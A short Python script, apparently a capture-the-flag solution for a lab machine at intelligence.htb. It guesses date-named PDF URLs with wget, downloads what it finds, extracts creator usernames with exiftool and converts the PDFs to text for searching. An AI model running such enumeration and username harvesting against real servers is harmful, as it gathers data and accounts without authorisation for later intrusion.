import subprocess
def files():
	with open("files.txt","w") as f:
		for k in range(1,13):
			for l in range(1,32):
				filename= f"2020-{k:02d}-{l:02d}-upload.pdf"
				f.write(filename+"\n")
files()
def brute():
	count=0
	for i in range(1,13):
		for j in range(1,32):
			result=subprocess.call(["wget","-q","--show-progress",f"http://intelligence.htb/documents/2020-{i:02d}-{j:02d}-upload.pdf"])
			if result==0:
				count+=1
	print(f"\n[+] Total files downloaded: {count}")
brute()
def exifmeta():
	print("[*] Downloading exiftool if not found!")
	subprocess.call("apt install exiftool -y",shell=True)
	subprocess.call("exiftool 2020* | grep 'Creator' | awk '{print $3}' > usernames.txt",shell=True)
	print("[+] Users written to usernames.txt")

exifmeta()
def pdf2textandGrep():
	# print("[*] Creating and activating python virtual environment")
	# subprocess.call("python3 -m venv intelligence",shell=True)
	# subprocess.call("source /bin/activate/intelligence")
	print("[*] Downloading pdf2txt.py if not found!")
	subprocess.call("pip install pdf2txt extractor",shell=True)
	print("------------------------------------------------------------------------")
	print("[*] Converting all the pdf documents to txt.")
	print("------------------------------------------------------------------------")
	subprocess.call("pdf2txt.py 2020* > pdf2textdata.txt",shell=True)
	print("[+] Data written to pdf2textdata.txt")

pdf2textandGrep()

